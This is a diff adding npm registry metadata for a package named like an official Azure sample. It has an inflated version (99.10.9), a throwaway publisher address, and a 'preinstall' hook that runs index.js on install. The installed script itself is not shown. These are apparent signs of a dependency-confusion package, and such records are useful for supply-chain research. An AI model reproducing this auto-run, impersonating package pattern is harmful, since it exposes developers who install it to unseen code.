@@ -1,0 +1,62 @@
+{
+    "_id": "azure-communication-identity-samples-js",
+    "name": "azure-communication-identity-samples-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "azure-communication-identity-samples-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "azure-communication-identity-samples-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-TsY0J7rBq2Gv5IzOvCkguHTekVeh+iKDNoqwxHGVkdPE2W0jpdcAY8aKLohVFp8cyGZwADOUn0W1lvLU0APclg==",
+                "shasum": "c0a98b08f02f10dde0d4519b66d28212e6ca0338",
+                "tarball": "https://registry.npmjs.org/azure-communication-identity-samples-js/-/azure-communication-identity-samples-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5091,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOnzUACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrBwg//cOv8ZXUEUsAMvb7exoEEwkhssBjHIlqI/HmzbM1TpbBtPvAX\r\n75tN2IViQ0eYzeS4GOAqvvic5+ZBvXLXbpqWyez9QL353h4T/vxgg+zlaapi\r\nfGZq5RZvTRsHyTShj2VkBNaBJR0faYf5t6ec47H5NmgoatPUAT8JHISLk0Nt\r\nYe8OqR3oiVLaIJnfIkZBfvt0eb9S/4zbinoQH2alu2LFS8SZNDYt1xxRv8lw\r\ngcbZylIGI9KwvOs3pc1rA6B1HXwBuqiFAPabffaNBg4C/tAk/2JMiLCNMMKo\r\ncGe3NVgzWpO43zsq2shXyZWhAX9cOpDQKbzkOIyevwY0Ao0DgeU/SPSI2EMF\r\ntV8MeoC8EEtgjAQ8CG2G4zDVMNt3tSFENqr+cBFSPtrQPeyhh5dscWvGhJt4\r\ny5y8EJ1nTmZlTcWJQuPKDXw9Cxvxh2ygleP+Nq/OOh5NOzTvMErCUzBBe6Vu\r\nQf2e6Cn/T0CkCJm7laRkANpiiIxK9JOK8tC7gkNZoRJJOeqjeqMi75DDGJio\r\nKQngm71MfOrQk/G5aInjNqNsxb5edz06GUFjpJSaH3Qw9OCh0OYSbVSaI8Ip\r\nGuZIgCspH077MasawXgFz0cQSOhPPodTdEgRE5Oy26ldkXaHlLli8z7erw1P\r\nEoWV5TEUGCOtIeBm6rf0J/syXq+2mBNeZy0=\r\n=3nvN\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "3dn12u3w",
+                "email": "3dn12u3w@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "3dn12u3w",
+                    "email": "3dn12u3w@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/azure-communication-identity-samples-js_99.10.9_1648000212659_0.991033561553291"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T01:50:12.658Z",
+        "99.10.9": "2022-03-23T01:50:12.806Z",
+        "modified": "2022-03-23T01:50:12.908Z"
+    },
+    "maintainers": [
+        {
+            "name": "3dn12u3w",
+            "email": "3dn12u3w@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
